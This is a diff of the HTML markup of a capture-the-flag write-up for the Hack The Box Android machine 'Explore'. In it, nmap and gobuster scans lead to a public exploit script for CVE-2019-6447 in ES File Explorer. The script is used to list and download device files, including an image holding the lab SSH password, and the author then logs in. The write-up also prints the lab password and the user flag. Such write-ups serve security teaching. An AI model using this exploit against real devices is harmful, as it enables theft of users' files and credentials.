@@ -17,13 +17,13 @@
 Points: 20
 Difficulty: Easy
 ip = 10.10.10.247
-nmap scan PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 4501/tcp closed unknown 5555/tcp filtered freeciv 7135/tcp closed unknown 8705/tcp closed unknown 17330/tcp closed unknown 17338/tcp closed unknown 20873/tcp closed unknown 25959/tcp closed unknown 32381/tcp closed unknown 33431/tcp closed unknown 36745/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.</description>
+nmap scan PORT STATE SERVICE VERSION2222/tcp open ssh (protocol 2.0)| fingerprint-strings:| NULL:|_ SSH-2.0-SSH Server - Banana Studio| ssh-hostkey:|_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)4501/tcp closed unknown5555/tcp filtered freeciv7135/tcp closed unknown8705/tcp closed unknown17330/tcp closed unknown17338/tcp closed unknown20873/tcp closed unknown25959/tcp closed unknown32381/tcp closed unknown33431/tcp closed unknown36745/tcp open unknown| fingerprint-strings:| GenericLines:| HTTP/1.</description>
       <content>&lt;p&gt;OS: Android&lt;br&gt;
 Points: 20&lt;br&gt;
 Difficulty: Easy&lt;/p&gt;
 &lt;p&gt;ip = 10.10.10.247&lt;/p&gt;
 &lt;h4 id=&#34;nmap-scan&#34;&gt;nmap scan&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;PORT      STATE    SERVICE VERSION
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT      STATE    SERVICE VERSION
 2222/tcp  open     ssh     (protocol 2.0)
 | fingerprint-strings:
 |   NULL:
@@ -109,52 +109,52 @@ Difficulty: Easy&lt;/p&gt;
 55744/tcp closed   unknown
 56823/tcp closed   unknown
 59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
-|_http-title: Site doesn&#39;t have a title (text/plain).
+|_http-title: Site doesn&amp;#39;t have a title (text/plain).
 60540/tcp closed   unknown
 60600/tcp closed   unknown
 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
 SF-Port2222-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(NU
-SF:LL,24,&amp;quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;quot;);
+SF:LL,24,&amp;#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;#34;);
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
 SF-Port36745-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(G
-SF:enericLines,AA,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
+SF:enericLines,AA,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
 SF:30\x20Jul\x202021\x2004:28:38\x20GMT\r\nContent-Length:\x2022\r\nConten
 SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
-SF:r\nInvalid\x20request\x20line:\x20&amp;quot;)%r(GetRequest,5C,&amp;quot;HTTP/1\.1\x20412\
+SF:r\nInvalid\x20request\x20line:\x20&amp;#34;)%r(GetRequest,5C,&amp;#34;HTTP/1\.1\x20412\
 SF:x20Precondition\x20Failed\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:2
-SF:8:38\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;quot;)%r(HTTPOptions,B5,&amp;quot;HTTP/1\
+SF:8:38\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;#34;)%r(HTTPOptions,B5,&amp;#34;HTTP/1\
 SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x
 SF:2004:28:44\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
 SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
-SF:0supported:\x20OPTIONS&amp;quot;)%r(RTSPRequest,BB,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20R
+SF:0supported:\x20OPTIONS&amp;#34;)%r(RTSPRequest,BB,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20R
 SF:equest\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:28:44\x20GMT\r\nCont
 SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
 SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
-SF:\x20\x20RTSP/1\.0&amp;quot;)%r(Help,AE,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
+SF:\x20\x20RTSP/1\.0&amp;#34;)%r(Help,AE,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
 SF:te:\x20Fri,\x2030\x20Jul\x202021\x2004:29:02\x20GMT\r\nContent-Length:\
 SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
-SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&amp;quot;)%r(SSLSessionReq
-SF:,DD,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2030\x20Jul\x
+SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&amp;#34;)%r(SSLSessionReq
+SF:,DD,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2030\x20Jul\x
 SF:202021\x2004:29:02\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
 SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
 SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
-SF:\0\?\?{\?\?\?\?w\?\?\?\?&amp;lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&amp;quot;)%r(TerminalSe
-SF:rverCookie,CA,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x203
+SF:\0\?\?{\?\?\?\?w\?\?\?\?&amp;lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&amp;#34;)%r(TerminalSe
+SF:rverCookie,CA,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x203
 SF:0\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:\x2054\r\nContent
 SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
 SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
-SF:hash=nmap&amp;quot;)%r(TLSSessionReq,DB,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
+SF:hash=nmap&amp;#34;)%r(TLSSessionReq,DB,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
 SF:ate:\x20Fri,\x2030\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:
 SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
 SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
-SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&amp;quot;);
+SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&amp;#34;);
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;user&#34;&gt;User&lt;/h2&gt;
 &lt;p&gt;There is a http server running on port &lt;code&gt;57999&lt;/code&gt;. Opening the page &lt;code&gt;http://10.10.10.247:59777/&lt;/code&gt; on browser
 gives the output&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;FORBIDDEN: No directory listing.
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FORBIDDEN: No directory listing.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using gobuster I tried to find other directories.&lt;code&gt;gobuster -u http://10.10.10.247:59777 -w /usr/share/wordlists/dirb/big.txt dir&lt;/code&gt;, output:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/acct                 (Status: 301) [Size: 65] [--&amp;gt; /acct/]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/acct                 (Status: 301) [Size: 65] [--&amp;gt; /acct/]
 /bin                  (Status: 301) [Size: 63] [--&amp;gt; /bin/]
 /cache                (Status: 301) [Size: 67] [--&amp;gt; /cache/]
 /config               (Status: 301) [Size: 69] [--&amp;gt; /config/]
@@ -176,107 +176,107 @@ gives the output&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In all directories listing is forbidden. I tried to get any credentials. But &lt;code&gt;/etc/ssh&lt;/code&gt; and  &lt;code&gt;/etc/passwd&lt;/code&gt; are not available. For &lt;code&gt;/init&lt;/code&gt; the reading of the file was forbidden. &lt;code&gt;/etc/hosts&lt;/code&gt; was available and while going to that file &lt;code&gt;http://10.10.10.247:59777/etc/hosts&lt;/code&gt;, it was getting downloaded.&lt;/p&gt;
 &lt;p&gt;So there are files in the machine and some which are readible to us. We have to &lt;strong&gt;explore files&lt;/strong&gt; in the machine. Searching for &amp;ldquo;explore file android exploits&amp;rdquo;.&lt;/p&gt;
 &lt;p&gt;The first result is CVE-2019-6447. It will list all the files in android server and can get it. The port in the exploit is set to &lt;code&gt;59777&lt;/code&gt;. Lets see exploits help&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Explore]
-└─$ python3 50070 help
-USAGE 50070 &amp;lt;command&amp;gt; &amp;lt;IP&amp;gt; [file to download]
-
-┌──(kali㉿kali)-[~/HTB/Explore]
-└─$ python3 50070 help 10.10.10.247                                                                            1 ⨯
-[-] WRONG COMMAND!
-Available commands :
-  listFiles         : List all Files.
-  listPics          : List all Pictures.
-  listVideos        : List all videos.
-  listAudios        : List all audios.
-  listApps          : List Applications installed.
-  listAppsSystem    : List System apps.
-  listAppsPhone     : List Communication related apps.
-  listAppsSdcard    : List apps on the SDCard.
-  listAppsAll       : List all Application.
-  getFile           : Download a file.
-  getDeviceInfo     : Get device info.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I used all the commands available and see if I get anything useful.
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ python3 50070 help
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USAGE 50070 &amp;lt;command&amp;gt; &amp;lt;IP&amp;gt; [file to download]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ python3 50070 help 10.10.10.247                                                                            1 ⨯
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[-] WRONG COMMAND!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Available commands :
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listFiles         : List all Files.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listPics          : List all Pictures.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listVideos        : List all videos.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAudios        : List all audios.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listApps          : List Applications installed.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAppsSystem    : List System apps.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAppsPhone     : List Communication related apps.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAppsSdcard    : List apps on the SDCard.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAppsAll       : List all Application.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  getFile           : Download a file.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  getDeviceInfo     : Get device info.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I used all the commands available and see if I get anything useful.
 Using &lt;code&gt;listPics&lt;/code&gt; I get a image of credentials.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Explore]
-└─$ python3 50070 listPics 10.10.10.247                                                                        1 ⨯
-
-==================================================================
-|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
-|                Coded By : Nehal a.k.a PwnerSec                 |
-==================================================================
-
-name : concept.jpg
-time : 4/21/21 02:38:08 AM
-location : /storage/emulated/0/DCIM/concept.jpg
-size : 135.33 KB (138,573 Bytes)
-
-name : anc.png
-time : 4/21/21 02:37:50 AM
-location : /storage/emulated/0/DCIM/anc.png
-size : 6.24 KB (6,392 Bytes)
-
-name : creds.jpg
-time : 4/21/21 02:38:18 AM
-location : /storage/emulated/0/DCIM/creds.jpg
-size : 1.14 MB (1,200,401 Bytes)
-
-name : 224_anc.png
-time : 4/21/21 02:37:21 AM
-location : /storage/emulated/0/DCIM/224_anc.png
-size : 124.88 KB (127,876 Bytes)
-
-
-┌──(kali㉿kali)-[~/HTB/Explore]
-└─$ python3 50070 getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
-
-==================================================================
-|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
-|                Coded By : Nehal a.k.a PwnerSec                 |
-==================================================================
-
-[+] Downloading file...
-[+] Done. Saved as `out.dat`.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The image contains:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;kristi
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ python3 50070 listPics 10.10.10.247                                                                        1 ⨯
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;==================================================================
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|                Coded By : Nehal a.k.a PwnerSec                 |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==================================================================
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : concept.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time : 4/21/21 02:38:08 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location : /storage/emulated/0/DCIM/concept.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;size : 135.33 KB (138,573 Bytes)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : anc.png
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time : 4/21/21 02:37:50 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location : /storage/emulated/0/DCIM/anc.png
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;size : 6.24 KB (6,392 Bytes)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : creds.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time : 4/21/21 02:38:18 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location : /storage/emulated/0/DCIM/creds.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;size : 1.14 MB (1,200,401 Bytes)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : 224_anc.png
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time : 4/21/21 02:37:21 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location : /storage/emulated/0/DCIM/224_anc.png
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;size : 124.88 KB (127,876 Bytes)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ python3 50070 getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;==================================================================
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|                Coded By : Nehal a.k.a PwnerSec                 |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==================================================================
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Downloading file...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Done. Saved as `out.dat`.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The image contains:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kristi
 Kr1sT!5h@Rp3xPl0r3!
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the credentials for ssh. Connecting through ssh&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;ssh kristi@10.10.10.247 -p 2222          
-The authenticity of host &#39;[10.10.10.247]:2222 ([10.10.10.247]:2222)&#39; can&#39;t be established.
-RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &#39;[10.10.10.247]:2222&#39; (RSA) to the list of known hosts.
-Password authentication
-Password:
-:/ $ ls
-acct                   init.superuser.rc       sbin
-bin                    init.usb.configfs.rc    sdcard
-bugreports             init.usb.rc             sepolicy
-cache                  init.zygote32.rc        storage
-charger                init.zygote64_32.rc     sys
-config                 lib                     system
-d                      mnt                     ueventd.android_x86_64.rc
-data                   odm                     ueventd.rc
-default.prop           oem                     vendor
-dev                    plat_file_contexts      vendor_file_contexts
-etc                    plat_hwservice_contexts vendor_hwservice_contexts
-fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
-init                   plat_seapp_contexts     vendor_seapp_contexts
-init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
-init.environ.rc        proc                    vndservice_contexts
-init.rc                product
-:/ $ whoami
-u0_a76
-:/ $ cd s
-sbin/     sdcard/   sepolicy  storage/  sys/      system/
-:/ $ cd sdcard/
-:/sdcard $ ls
-Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
-Android Download Music  Pictures      Ringtones dianxinos
-:/sdcard $ ca
-cal             cameraserver    case            cat             catv
-:/sdcard $ cat user.txt
-f32017174c7c7e8f50c6da52891ae250
-&lt;/code&gt;&lt;/pre&gt;</content>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh kristi@10.10.10.247 -p 2222          
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;The authenticity of host &amp;#39;[10.10.10.247]:2222 ([10.10.10.247]:2222)&amp;#39; can&amp;#39;t be established.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: Permanently added &amp;#39;[10.10.10.247]:2222&amp;#39; (RSA) to the list of known hosts.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password authentication
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/ $ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;acct                   init.superuser.rc       sbin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bin                    init.usb.configfs.rc    sdcard
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bugreports             init.usb.rc             sepolicy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cache                  init.zygote32.rc        storage
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;charger                init.zygote64_32.rc     sys
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config                 lib                     system
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d                      mnt                     ueventd.android_x86_64.rc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data                   odm                     ueventd.rc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;default.prop           oem                     vendor
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dev                    plat_file_contexts      vendor_file_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;etc                    plat_hwservice_contexts vendor_hwservice_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;init                   plat_seapp_contexts     vendor_seapp_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;init.environ.rc        proc                    vndservice_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;init.rc                product
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/ $ whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;u0_a76
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/ $ cd s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sbin/     sdcard/   sepolicy  storage/  sys/      system/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/ $ cd sdcard/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/sdcard $ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
